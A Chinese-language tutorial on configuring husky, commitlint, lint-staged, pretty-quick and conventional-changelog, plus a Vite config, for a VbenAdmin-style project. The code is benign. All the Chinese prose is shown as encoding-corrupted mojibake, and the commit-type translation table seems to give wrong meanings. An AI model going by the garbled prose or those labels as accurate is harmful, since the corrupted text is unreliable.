is-ciï¼šhuskyå¥½åƒä¸èƒ½åœ¨ciç’°å¢ƒä¸‹åŸ·è¡Œï¼Œé€™å€‹ä¾è³´æ˜¯ç”¨ä¾†åˆ¤æ–·æ˜¯ä¸æ˜¯ciç’°å¢ƒçš„ã€‚ åƒè€ƒé€£çµ huskyçš„npmé¦–é  huskyå®˜æ–¹æ–‡æª” lint-stagedçš„npmé¦–é  @commitlint/cliçš„npmé¦–é  @commitlint/cilå®˜ç¶² @commitlint/config-conventionalçš„é¦–é  pretty-quickçš„npmé¦–é  Prettierå®˜ç¶²å°Gité‰¤å­å‡½æ•¸çš„æ”¯æŒèªªæ˜ is-ciçš„npmé¦–é  å‰ç«¯ä»£ç¢¼è¦ç¯„å¾0åˆ°1 å‰ç«¯å·¥ä½œæµ å®‰è£ 1 yarn add husky lint-staged @commitlint/cli @commitlint/config-conventional pretty-quick is-ci --dev é…ç½®commitlint commitlintå®˜æ–¹é…ç½®èªªæ˜ commitlinté…ç½®è¦å‰‡ åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºcommitlint.config.jsæ–‡ä»¶ã€‚\ncommitlint.config.js 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 module.exports = { // â†“ å¿½ç•¥åŒ…å«initçš„æäº¤æ¶ˆæ¯ ignores: [(commit) =\u0026gt; commit.includes(\u0026#39;init\u0026#39;)], // â†“ æŒ‰ç…§ä¼ ç»Ÿæ¶ˆæ¯æ ¼å¼æ¥éªŒè¯ extends: [\u0026#39;@commitlint/config-conventional\u0026#39;], // â†“ è¿™é‡Œæ˜¯è‡ªå®šä¹‰è§£æå™¨ï¼Œçœ‹ä¸å¤ªæ‡‚ï¼Œç›´æ¥æ¬ä»£ç å§ // â†“ https://commitlint.js.org/#/reference-configuration?id=parser-presets parserPreset: { parserOpts: { headerPattern: /^(\\w*|[\\u4e00-\\u9fa5]*)(?:[\\(\\ï¼ˆ](.*)[\\)\\ï¼‰])?[\\:\\ï¼š] (.*)/, headerCorrespondence: [\u0026#39;type\u0026#39;, \u0026#39;scope\u0026#39;, \u0026#39;subject\u0026#39;], referenceActions: [ \u0026#39;close\u0026#39;, \u0026#39;closes\u0026#39;, \u0026#39;closed\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;fixes\u0026#39;, \u0026#39;fixed\u0026#39;, \u0026#39;resolve\u0026#39;, \u0026#39;resolves\u0026#39;, \u0026#39;resolved\u0026#39; ], issuePrefixes: [\u0026#39;#\u0026#39;], noteKeywords: [\u0026#39;BREAKING CHANGE\u0026#39;, \u0026#39;ä¸å…¼å®¹å˜æ›´\u0026#39;], fieldPattern: /^-(.*?)-$/, revertPattern: /^Revert\\s\u0026#34;([\\s\\S]*)\u0026#34;\\s*This reverts commit (\\w*)\\./, revertCorrespondence: [\u0026#39;header\u0026#39;, \u0026#39;hash\u0026#39;], warn() {}, mergePattern: null, mergeCorrespondence: null } }, // â†“ è‡ªå®šä¹‰æäº¤æ¶ˆæ¯è§„åˆ™ rules: { // â†“ bodyä»¥ç©ºç™½è¡Œå¼€å¤´ \u0026#39;body-leading-blank\u0026#39;: [2, \u0026#39;always\u0026#39;], // â†“ footerä»¥ç©ºç™½è¡Œå¼€å¤´ \u0026#39;footer-leading-blank\u0026#39;: [1, \u0026#39;always\u0026#39;], // â†“ headerçš„æœ€å¤§é•¿åº¦ \u0026#39;header-max-length\u0026#39;: [2, \u0026#39;always\u0026#39;, 108], // â†“ subjectä¸ºç©º \u0026#39;subject-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // â†“ typeä¸ºç©º \u0026#39;type-empty\u0026#39;: [2, \u0026#39;never\u0026#39;], // â†“ typeçš„ç±»å‹ \u0026#39;type-enum\u0026#39;: [ 2, \u0026#39;always\u0026#39;, [ \u0026#39;feat\u0026#39;, \u0026#39;fix\u0026#39;, \u0026#39;perf\u0026#39;, \u0026#39;style\u0026#39;, \u0026#39;docs\u0026#39;, \u0026#39;test\u0026#39;, \u0026#39;refactor\u0026#39;, \u0026#39;build\u0026#39;, \u0026#39;ci\u0026#39;, \u0026#39;chore\u0026#39;, \u0026#39;revert\u0026#39;, \u0026#39;wip\u0026#39;, \u0026#39;workflow\u0026#39;, \u0026#39;types\u0026#39; ] ] } }; é…ç½®husky å•Ÿå‹•Gité‰¤å­ 1 npx husky install é€™å€‹æ™‚å€™å°±åœ¨æ ¹ç›®éŒ„ä¸‹å‰µå»ºäº†.huskyç›®éŒ„äº†ã€‚ vbenå°‡è£¡é¢çš„ä¸€å€‹æ–‡ä»¶å¤¾åˆªé™¤äº†ã€‚\nä¿®å¾©YarnOnWindowsBug å®˜æ–¹åƒè€ƒé€£çµ\nåœ¨å¸¶æœ‰Git Bashï¼ˆstdin is not a ttyï¼‰çš„Windowsä¸Šä½¿ç”¨Yarnæ™‚ï¼ŒGitæ›é‰¤å¯èƒ½æœƒå¤±æ•—ã€‚å¦‚æœæ‚¨æœ‰Windowsç”¨æˆ¶ï¼Œå‰‡å¼·çƒˆå»ºè­°æ·»åŠ ä»¥ä¸‹è§£æ±ºæ–¹æ³•ã€‚\nå‰µå»º.husky/common.shï¼š 1 2 3 4 5 6 7 8 command_exists () { command -v \u0026#34;$1\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1 } # Workaround for Windows 10, Git Bash and Yarn if command_exists winpty \u0026amp;\u0026amp; test -t 1; then exec \u0026lt; /dev/tty fi åœ¨ä½¿ç”¨Yarné‹è¡Œå‘½ä»¤çš„åœ°æ–¹å°‡å…¶ä¾†æºï¼š 1 2 3 4 5 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; yarn ... é€™è£¡æ˜¯yarnå‘½ä»¤çš„åœ°æ–¹è¦é€™æ¨£ç”¨ï¼Œå…¶ä»–åœ°æ–¹è¦ä¸è¦ç„¡æ‰€è¬‚ã€‚ç¬¬äºŒæ­¥å¯ä»¥å…ˆä¸ç®¡ã€‚\nå‰µå»ºlint-stagedçš„é…ç½®æ–‡ä»¶ lint:lint-staged package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:lint-staged\u0026#34;: \u0026#34;lint-staged -c ./.husky/lintstagedrc.js\u0026#34; } ä½œç”¨ï¼šå°Gitæš«å­˜çš„æ–‡ä»¶é€²è¡Œlintæª¢æŸ¥ã€‚\nlint:pretty package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;lint:pretty\u0026#34;: \u0026#34;pretty-quick --staged\u0026#34; } ä½œç”¨ï¼šå°Gitæš«å­˜æ–‡ä»¶é€²è¡Œprettyçš„æ“ä½œã€‚\ninstall:husky package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;install:husky\u0026#34;: \u0026#34;is-ci || husky install\u0026#34; } ä½œç”¨ï¼šå¦‚æœä¸æ˜¯CIæœå‹™å™¨ï¼Œå°±å•Ÿå‹•Gité‰¤å­ã€‚\npostinstall package.json 1 2 3 \u0026#34;scripts\u0026#34;: { \u0026#34;postinstall\u0026#34;: \u0026#34;npm run install:husky\u0026#34; } ä½œç”¨ï¼šåŸ·è¡Œinstall:huskyå‘½ä»¤ã€‚é€™å€‹å‘½ä»¤æœƒè‡ªå‹•å•Ÿå‹•Gité‰¤å­ï¼Œåƒè€ƒæ–‡æª”ã€‚\nçµ¦huskyæ·»åŠ ä»»å‹™ npxçš„Gité¦–é ï¼Œæœ‰å‘½ä»¤è¡Œèªªæ˜ commitlintçš„å‘½ä»¤è¡Œèªªæ˜ 1 2 3 4 5 6 7 8 9 10 # å•Ÿå‹•husky yarn install:husky # æ·»åŠ commitæ¶ˆæ¯æª¢æŸ¥ä»»å‹™åˆ°`.husky/commit-msg`æ–‡ä»¶ä¸­ # é€™è£¡æˆ‘ä¸€ç›´åŸ·è¡Œä¸å‡ºä¾†ï¼Œæ˜¯å¼•è™Ÿå¼•å…¶çš„å•é¡Œï¼Œå¤§å®¶å¯ä»¥å…ˆå‰µå»ºç©ºçš„ç„¶å¾ŒæŠŠå‘½ä»¤è¤‡è£½é€²å» # npx husky add .husky/commit-msg \u0026#39;npx --no-install commitlint --edit \u0026#34;$1\u0026#34;\u0026#39; npx husky add .husky/commit-msg # å‰µå»ºä¸€å€‹ä»»å‹™æ–‡ä»¶ npx husky add .husky/pre-commit æ‰‹å‹•ä¿®æ”¹.husky/commit-msgæ–‡ä»¶ï¼š\né€™è£¡é¢çš„$1ä¸€å®šè¦ç”¨é›™å¼•è™Ÿï¼Œä¸ç„¶å¾Œé¢åŸ·è¡Œæœƒå ±éŒ¯ã€‚\n.husky/commit-msg 1 2 3 4 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; npx --no-install commitlint --edit \u0026#34;$1\u0026#34; æ‰‹å‹•ä¿®æ”¹.husky/pre-commitæ–‡ä»¶ï¼š\nåƒè€ƒé€£çµï¼š\nåœ¨CIä¸­ç¦ç”¨é‰¤å­ åœ¨Windowsä¸Šçš„Yarn æœ€å¾Œæ‰‹å‹•åŸ·è¡Œä¹‹å‰å‰µå»ºçš„è…³æœ¬å‘½ä»¤ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #!/bin/sh . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/_/husky.sh\u0026#34; . \u0026#34;$(dirname \u0026#34;$0\u0026#34;)/common.sh\u0026#34; [ -n \u0026#34;$CI\u0026#34; ] \u0026amp;\u0026amp; exit 0 # Check the file name # ! ls-lint cannot be used normally in mac pro of M1 system. npm run lint:ls-lint # Format and submit code according to lintstagedrc.js configuration npm run lint:lint-staged npm run lint:pretty æ¸¬è©¦ å¤±æ•—æ¸¬è©¦ æœ€å¥½å…ˆé‡å•Ÿä½ çš„ide\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 git add . git commit -m \u0026#34;éš¨ä¾¿æ‰“ä¸€äº›æ¶ˆæ¯\u0026#34; \u0026gt; vben3@0.0.0 lint:ls-lint F:\\CodeLearn\\vben\\vben3 \u0026gt; ls-lint \u0026gt; vben3@0.0.0 lint:lint-staged F:\\CodeLearn\\vben\\vben3 \u0026gt; lint-staged -c ./.husky/lintstagedrc.js [STARTED] Preparing... # ä¸€ç³»åˆ—æª¢æŸ¥... [SUCCESS] Cleaning up... \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged ï¿½ğŸ” Finding changed files since git revision 1346762. ï¿½ğŸ¯ Found 2 changed files. âœ… Everything is awesome! â§— input: éš¨ä¾¿æ‰“ä¸€äº›æ¶ˆæ¯ âœ– subject may not be empty [subject-empty] âœ– type may not be empty [type-empty] âœ– found 2 problems, 0 warnings â“˜ Get help: https://github.com/conventional-changelog/commitlint/#what-is-commitlint husky - commit-msg hook exited with code 1 (error) æ ¼å¼ å‡ºéŒ¯äº†ï¼Œæˆ‘å€‘è¦ç¯„çš„æäº¤æ¶ˆæ¯è©¦è©¦ï¼š\n@commitlint/config-conventionalçš„è¦ç¯„+æˆ‘å€‘è‡ªå®šç¾©çš„è¦å‰‡ã€‚\ntype: some message\né¡å‹è‹±æ–‡ é¡å‹ä¸­æ–‡ build å»ºç«‹ chore é›œäº‹ ci ci docs æ–‡æª” feat å£¯èˆ‰ fix ä¿®å¾© perf æ•·è¡ refactor é‡æ§‹ revert æ¢å¾© style æ¨£å¼ test æ¸¬è©¦ æˆåŠŸæ¸¬è©¦ æäº¤æˆåŠŸï¼Œç•¶ç„¶ä½ ä¸ç”¨æ“”å¿ƒé€™æ¨£æ‰‹æ•²å¤ªéº»ç…©äº†ï¼Œå¾Œé¢é‚„æœ‰æ’ä»¶å¯ä»¥è‡ªå‹•å¹«ä½ æ•²é€™äº›æ ¼å¼ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 git commit -m \u0026#34;feat: æˆ‘å€‘æˆåŠŸçš„è¦ç¯„äº†Gitæäº¤!\u0026#34; \u0026gt; vben3@0.0.0 lint:pretty F:\\CodeLearn\\vben\\vben3 \u0026gt; pretty-quick --staged ï¿½ğŸ” Finding changed files since git revision 1346762. ï¿½ğŸ¯ Found 2 changed files. âœ… Everything is awesome! [master 6c61fc5] feat: æˆ‘å€‘æˆåŠŸçš„è¦ç¯„äº†Gitæäº¤! 7 files changed, 104 insertions(+), 4 deletions(-) create mode 100644 .husky/.gitignore create mode 100644 .husky/commit-msg create mode 100644 .husky/common.sh create mode 100644 .husky/lintstagedrc.js create mode 100644 .husky/pre-commit # æ¨é€å‡ºå» git push -u origin master ä½¿ç”¨conventional-changelog-cliç”Ÿæˆè®Šæ›´è¨˜éŒ„ èªªæ˜ åœ¨VbenAdminé …ç›®çš„è…³æœ¬å‘½ä»¤å’Œæ ¹ç›®éŒ„ä¸­é‚„æœ‰CHANGELOG.mdé€™éº¼å€‹æ–‡ä»¶ï¼Œé€™æ˜¯è¨˜éŒ„æˆ‘å€‘é …ç›®è®Šæ›´è¨˜éŒ„çš„MDã€‚æ˜é¡¯ä¸æ˜¯æ‰‹å¯«å‡ºä¾†çš„ï¼Œé‚£éº¼æ€éº¼ç”Ÿæˆï¼Ÿ\nåƒè€ƒé€£çµï¼š\nconventional-changelog-cliçš„Gitèªªæ˜ conventional-changelog-cliçš„npmé¦–é  å®‰è£ 1 yarn add global conventional-changelog-cli --dev é…ç½®è…³æœ¬ package.jsonæ–‡ä»¶ä¸­çš„scriptså­—æ®µã€‚\npackage.json 1 2 3 4 5 \u0026#34;scripts\u0026#34;: { // ... \u0026#34;log\u0026#34;: \u0026#34;conventional-changelog -p angular -i CHANGELOG.md -s\u0026#34;, // ... } æ¸¬è©¦ 1 yarn log å¯ä»¥çœ‹è¦‹ç”Ÿæˆäº†CHANGELOG.mdæ–‡ä»¶\n1 2 3 4 5 6 # 0.0.0 (2022-10-13) ### Features - æˆ‘ä»¬æˆåŠŸçš„è§„èŒƒäº† Git æäº¤! ([6c61fc5](https://gitee.com/kuxiaoxin/vben3/commits/6c61fc5c0bc9d0ed551117eb00349ce82e35deea)) å‘½ä»¤åˆ—åƒæ•¸ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 \u0026gt; conventional-changelog --help Generate a changelog from git metadata Usage conventional-changelog Example conventional-changelog -i CHANGELOG.md --same-file Options -i, --infile Read the CHANGELOG from this file # å¾é€™å€‹æ–‡ä»¶ä¸­è®€å–CHANGELOGã€‚ -o, --outfile Write the CHANGELOG to this file If unspecified, it prints to stdout # å°‡CHANGELOGå¯«å…¥é€™å€‹æ–‡ä»¶ã€‚ # å¦‚æœæ²’æœ‰æŒ‡å®šï¼Œå‰‡æ‰“å°åˆ°stdoutã€‚ -s, --same-file Outputting to the infile so you don\\\u0026#39;t need to specify the same file as outfile # è¼¸å‡ºåˆ°infileï¼Œæ‰€ä»¥ä½ ä¸éœ€è¦æŒ‡å®šèˆ‡outfileç›¸åŒçš„æ–‡ä»¶ã€‚ -p, --preset Name of the preset you want to use. Must be one of the following: angular, atom, codemirror, ember, eslint, express, jquery, jscs or jshint # æ‚¨è¦ä½¿ç”¨çš„é è¨­åç¨±ã€‚å¿…é ˆæ˜¯ä¸‹åˆ—ä¹‹ä¸€ã€‚ # angular, atom, codemirror, # ember, eslint, express, # jquery, jscs, jshintã€‚ -k, --pkg A filepath of where your package.json is located Default is the closest package.json from cwd # æ‚¨çš„ package.json æ‰€åœ¨çš„æ–‡ä»¶è·¯å¾‘ã€‚ # é»˜èªç‚ºcwdä¸­æœ€æ¥è¿‘çš„package.jsonã€‚ -a, --append Should the newer release be appended to the older release Default: \\false # æ˜¯å¦æ‡‰å°‡è¼ƒæ–°çš„ç‰ˆæœ¬é™„åŠ åˆ°è¼ƒèˆŠçš„ç‰ˆæœ¬ä¸Šï¼Ÿ # é»˜èªï¼šä¸è¿½åŠ  -r, --release-count How many releases to be generated from the latest If 0, the whole changelog will be regenerated and the outfile will be overwritten Default: 1 # å°‡å¾æœ€æ–°çš„ç‰ˆæœ¬ä¸­ç”Ÿæˆå¤šå°‘å€‹ç‰ˆæœ¬ã€‚ # å¦‚æœç‚º0ï¼Œæ•´å€‹è®Šæ›´æ—¥èªŒå°‡è¢«é‡æ–°ç”Ÿæˆï¼Œä¸¦ä¸”è¼¸å‡ºæ–‡ä»¶å°‡è¢«è¦†è“‹ã€‚ # é»˜èªå€¼: 1 --skip-unstable If given, unstable tags will be skipped, e.g., x.x.x-alpha.1, x.x.x-rc.2 # å¦‚æœçµ¦å®šï¼Œå°‡è·³éä¸ç©©å®šçš„æ¨™ç±¤ï¼Œä¾‹å¦‚ï¼Œx.x.x-alpha.1, x.x.x-rc.2ã€‚ -u, --output-unreleased Output unreleased changelog # è¼¸å‡ºæœªç™¼å¸ƒçš„è®Šæ›´æ—¥èªŒã€‚ -v, --verbose Verbose output. Use this \\for debugging Default: \\false # Verbose è¼¸å‡ºã€‚ç”¨ä¾†èª¿è©¦ # é»˜èªï¼šä¸è¼¸å‡º -n, --config A filepath of your config script Example of a config script: https://github.com/conventional-changelog/conventional-changelog/blob/master/packages/conventional-changelog-cli/test/fixtures/config.js # é…ç½®è…³æœ¬çš„æ–‡ä»¶è·¯å¾‘ã€‚ # é…ç½®è…³æœ¬çš„ä¾‹å­ï¼š # https://github.com/conventional-changelog # /conventional-changelog/blob/master/packages # /conventional-changelog-cli/test/fixtures/config.js -c, --context A filepath of a json that is used to define template variables # ä¸€å€‹ç”¨æ–¼å®šç¾©æ¨¡æ¿è®Šé‡çš„jsonæ–‡ä»¶è·¯å¾‘ã€‚ -l, --lerna-package Generate a changelog \\for a specific lerna package (:pkg-name@1.0.0) # ç‚ºä¸€å€‹ç‰¹å®šçš„lernaåŒ…ç”Ÿæˆä¸€å€‹è®Šæ›´æ—¥èªŒ(:pkg-name@1.0.0) -t, --tag-prefix Tag prefix to consider when reading the tags # è®€å–æ¨™ç±¤æ™‚è¦è€ƒæ…®çš„æ¨™ç±¤å‰ç¶´ã€‚ --commit-path Generate a changelog scoped to a specific directory # ç”Ÿæˆä¸€å€‹ç‰¹å®šç›®éŒ„ä¸‹çš„è®Šæ›´æ—¥èªŒã€‚ é…ç½®Vite èªªæ˜ æœ¬ç« åªæ˜¯æº–å‚™ï¼Œå¤§å®¶å¯ä»¥ç›´æ¥æŠŠVbenAdminçš„vite.config.tsåŸä»£ç¢¼è¤‡è£½åˆ°æˆ‘å€‘çš„é …ç›®ä¸­ã€‚ç„¶å¾ŒæŠŠå ±éŒ¯çš„åœ°æ–¹è¨»é‡‹æ‰ã€‚æ¥ä¸‹ä¾†çš„ç« ç¯€æœƒæŠŠé€™å€‹æ–‡ä»¶ä¸€æ®µä¸€æ®µçš„è§£æå‡ºä¾†ã€‚ç« ç¯€åšå¤ªé•·äº†å¤§å®¶æ‡‰è©²ä¹Ÿä¸å–œæ­¡çœ‹ï¼Œè‡³å°‘æˆ‘ä¸å–œæ­¡çœ‹é•·æ–‡ç« ã€‚\nä»£ç¢¼ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 import type { UserConfig, ConfigEnv } from \u0026#39;vite\u0026#39;; import { loadEnv } from \u0026#39;vite\u0026#39;; import { resolve } from \u0026#39;path\u0026#39;; // import { generateModifyVars } from \u0026#39;./build/config/themeConfig\u0026#39;; // import { createProxy } from \u0026#39;./build/vite/proxy\u0026#39;; // import { wrapperEnv } from \u0026#39;./build/utils\u0026#39;; // import { createVitePlugins } from \u0026#39;./build/vite/plugin\u0026#39;; // import { OUTPUT_DIR } from \u0026#39;./build/constant\u0026#39;; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir); } export default ({ command, mode }: ConfigEnv): UserConfig =\u0026gt; { const root = process.cwd() const env = loadEnv(mode, root) // The boolean type read by loadEnv is a string. This function can be converted to boolean type // const viteEnv = wrapperEnv(env); // const { VITE_PORT, VITE_PUBLIC_PATH, VITE_PROXY, VITE_DROP_CONSOLE, VITE_LEGACY } = viteEnv; // const isBuild = command === \u0026#39;build\u0026#39;; return { // base: VITE_PUBLIC_PATH, root, resolve: { alias: [ { // /@/xxxx =\u0026gt; src/xxx find: /^\\/@\\//, replacement: pathResolve(\u0026#39;src\u0026#39;) + \u0026#39;/\u0026#39; }, { // /#/xxxx =\u0026gt; types/xxx find: /^\\/#\\//, replacement: pathResolve(\u0026#39;types\u0026#39;) + \u0026#39;/\u0026#39; } ] }, server: { // port: VITE_PORT, // Load proxy configuration from .env // proxy: createProxy(VITE_PROXY), hmr: { overlay: true } }, build: { // minify: \u0026#39;esbuild\u0026#39;, // outDir: OUTPUT_DIR, // polyfillDynamicImport: VITE_LEGACY, terserOptions: { compress: { keep_infinity: true, // Used to delete console in production environment // drop_console: VITE_DROP_CONSOLE, }, }, // Turning off brotliSize display can slightly reduce packaging time brotliSize: false, chunkSizeWarningLimit: 1200 }, define: { // setting vue-i18-next // Suppress warning __VUE_I18N_LEGACY_API__: false, __VUE_I18N_FULL_INSTALL__: false, __INTLIFY_PROD_DEVTOOLS__: false }, css: { preprocessorOptions: { less: { modifyVars: { // Used for global import to avoid the need to import each style file separately // reference: Avoid repeated references hack: `true; @import (reference) \u0026#34;${resolve(\u0026#39;src/design/config.less\u0026#39;)}\u0026#34;;` // ...generateModifyVars(), }, javascriptEnabled: true } } }, // The vite plugin used by the project. The quantity is large, so it is separately extracted and managed // plugins: createVitePlugins(viteEnv, isBuild), optimizeDeps: { // @iconify/iconify: The dependency is dynamically and virtually loaded by @purge-icons/generated, so it needs to be specified explicitly include: [ \u0026#39;@iconify/iconify\u0026#39;, \u0026#39;ant-design-vue/es/locale/zh_CN\u0026#39;, \u0026#39;moment/dist/locale/zh-cn\u0026#39;, \u0026#39;ant-design-vue/es/locale/en_US\u0026#39;, \u0026#39;moment/dist/locale/eu\u0026#39;, ], exclude: [\u0026#39;vue-demi\u0026#39;] } } } Nodeçš„path.resolveæ–¹æ³• èªªæ˜ psth.resolve([...paths])æ–¹æ³•æ˜¯NodeApiä¸­pathæ¨¡å¡Šçš„æ–¹æ³•ã€‚\nåƒè€ƒé€£çµ Nodeä¸­æ–‡API path.resolve([\u0026hellip;paths])æ–¹æ³• path.resolve([\u0026hellip;path])æ–¹æ³•åœ¨ç·šé‹è¡Œ psth.resolve([\u0026hellip;pth])è¼ƒé€šä¿—çš„ç†è§£ VbenAdminåŸä»£ç¢¼ 1 2 3 4 5 import { resolve } from \u0026#39;path\u0026#39; function pathResolve(dir: string) { return resolve(__dirname, \u0026#39;.\u0026#39;, dir) } ä»£ç¢¼åœ¨é …ç›®ä¸­å ±éŒ¯ æ­¤æ™‚å¼•å…¥é …ç›®æœƒå ±éŒ¯ï¼šæ‰¾ä¸åˆ° pathã€‚\nå› ç‚ºæˆ‘å€‘æ²’æœ‰å®‰è£nodeçš„è²æ˜æ–‡ä»¶ï¼Œtsè£¡é¢æ²’æœ‰ã€‚\n1 yarn add @types/node --dev é€™å€‹é–‹ç™¼ä¾è³´åœ¨åŸVbenAdminé …ç›®ä¸­æ²’æœ‰ï¼Œæ˜¯å› ç‚ºå…¶ä»–ä¾è³´ä¸­æœ‰é€™å€‹ä¾è³´ã€‚\nä½†æ˜¯æˆ‘å€‘ç¾åœ¨é‚„æ²’æœ‰å®‰è£åŒ…å«@types/nodeçš„ä¾è³´ã€‚\nå‰©ä¸‹çš„ä¾è³´è£¡é¢æœ‰å¾ˆå¤šé€™æ¨£çš„ä¾è³´ï¼Œæˆ‘å€‘ä¹Ÿä¸å»çŒœæ˜¯å“ªå€‹ä¾è³´äº†ã€‚\nåæ­£æ˜¯ä¸€å€‹é–‹ç™¼ä¾è³´ï¼Œæˆ‘å€‘ç›´æ¥è‡ªå·±æ‰‹å‹•å®‰è£äº†ã€‚\nresolveæ–¹æ³• è©²æ–¹æ³•ç™¾åº¦ä¸Šæœ‰å…©ç¨®èªªæ³•ï¼š\nå¾å¾Œå‘å‰ï¼Œç”Ÿæˆçµ•å°è·¯å¾‘ã€‚ è‹¥å­—ç¬¦ä»¥ / é–‹é ­ï¼Œä¸æœƒæ‹¼æ¥åˆ°å‰é¢çš„è·¯å¾‘ï¼ˆå› ç‚ºæ‹¼æ¥åˆ°æ­¤å·²ç¶“æ˜¯ä¸€å€‹çµ•å°è·¯å¾‘ï¼‰ã€‚ è‹¥ä»¥ ../ é–‹é ­ï¼Œæ‹¼æ¥å‰é¢çš„è·¯å¾‘ï¼Œä¸”ä¸å«æœ€å¾Œä¸€ç¯€è·¯å¾‘ã€‚ è‹¥ä»¥ ./ é–‹é ­ æˆ–è€…æ²’æœ‰ç¬¦è™Ÿ å‰‡æ‹¼æ¥å‰é¢è·¯å¾‘ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼šå¦‚æœåœ¨è™•ç†å®Œæ‰€æœ‰çµ¦å®šçš„ path ç‰‡æ®µä¹‹å¾Œé‚„æœªç”Ÿæˆçµ•å°è·¯å¾‘ï¼Œå‰‡å†åŠ ä¸Šç•¶å‰å·¥ä½œç›®éŒ„ã€‚ æ¯ä¸€å€‹åƒæ•¸éƒ½ç†è§£ç‚ºä¸€å€‹cdå‘½ä»¤ã€‚æœ€çµ‚cdåˆ°å“ªå€‹è·¯å¾‘ã€‚è¿”å›è©²çµ•å°è·¯å¾‘ã€‚ __dirname NodeApiçš„__dirnameï¼šç•¶å‰æ¨¡å¡Šç›®éŒ„åã€‚\nNodeApiæ–‡æª”-__dirnameèªªæ˜ __dirnameåœ¨ç·šé‹è¡Œ åœ¨ç·šé‹è¡Œ 1 2 3 4 5 6 const path = require(\u0026#39;path\u0026#39;) console.log(__dirname) console.log(path.resolve(__dirname, \u0026#39;.\u0026#39;, \u0026#39;src\u0026#39;)) // /tmp/B3YQQ1 // /tmp/B3YQQ1/src Viteçš„æƒ…æ™¯é…ç½® èªªæ˜ æœ¬ç« æ”¶é›†äº†ä¸€äº›Viteå¦‚ä½•æ ¹æ“šä¸åŒç’°å¢ƒé€²è¡Œä¸åŒé…ç½®çš„è³‡æ–™ã€‚\nåƒè€ƒé€£çµ Viteçš„ä¸­æ–‡é¦–é  Viteçš„è‹±æ–‡é¦–é  Viteçš„æƒ…æ™¯é…ç½®èªªæ˜ ä»£ç¢¼ ç¸½ä¹‹ä¸ç®¡ä½¿ç”¨ä»€éº¼æ–¹å¼é…ç½®Viteï¼Œæœ€å¾Œè¿”å›çš„å°±åªæ˜¯ä¸€å€‹å°è±¡ã€‚å°åƒä¸­åŒ…å«Viteé…ç½®çš„ç´°ç¯€ã€‚\n1 2 3 4 5 6 7 8 9 10 11 export default ({ command, mode }) =\u0026gt; { if (command === \u0026#34;serve\u0026#34;) { return { // serve ç¨æœ‰é…ç½® } } else { return { // build ç¨æœ‰é…ç½® } } } åƒæ•¸èªªæ˜ viteç›®å‰åªæœ‰viteã€vite buildã€vite previewé€™ä¸‰ç¨®å‘½ä»¤ã€‚ä»¥ä¸‹æ˜¯é€™ä¸‰ç¨®å‘½ä»¤çš„commandå’Œmodeçš„å€¼ã€‚\nvite commandï¼šserve modeï¼šdevelopment vite build commandï¼šbuild modeï¼šproduction vite preview commandï¼šserve modeï¼šdevelopment Nodeçš„process èªªæ˜ è¿”å› Node.js é€²ç¨‹çš„ç•¶å‰å·¥ä½œç›®éŒ„ã€‚\nåƒè€ƒé€£çµ Nodeä¸­æ–‡æ–‡æª”-process Nodeä¸­æ–‡æ–‡æª”-process.cwd()æ–¹æ³• åœ¨ç·šé‹è¡Œprocess.cwd() ä»£ç¢¼ 1 process.cwd() Viteçš„loadEnvæ–¹æ³• èªªæ˜ æª¢æŸ¥process.cwd()è·¯å¾‘ä¸‹.env.development.localã€.env.developmentã€.env.localã€.envé€™å››å€‹ç’°å¢ƒæ–‡ä»¶ã€‚ è¼¸å‡ºNODE_ENVå’ŒVITE_é–‹é ­çš„éµå€¼å°ã€‚ VITE_é–‹é ­çš„éµå€¼å°å¾Œé¢çš„ä¸æœƒè¦†è“‹å‰é¢çš„ã€‚ NODE_ENVçš„å€¼å¾Œé¢çš„æœƒè¦†è“‹å‰é¢çš„ã€‚ åƒè€ƒé€£çµ NodeApiä¸­æ–‡æ–‡æª”-process NodeApiä¸­æ–‡æ–‡æª”-process-envèªªæ˜ NodeApiä¸­æ–‡æ–‡æª”-path NodeApiä¸­æ–‡æ–‡æª”-path.join()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-path.dirname()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs NodeApiä¸­æ–‡æ–‡æª”-fs.existsSync()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs.statSync()æ–¹æ³• NodeApiä¸­æ–‡æ–‡æª”-fs.readFileSync()æ–¹æ³• 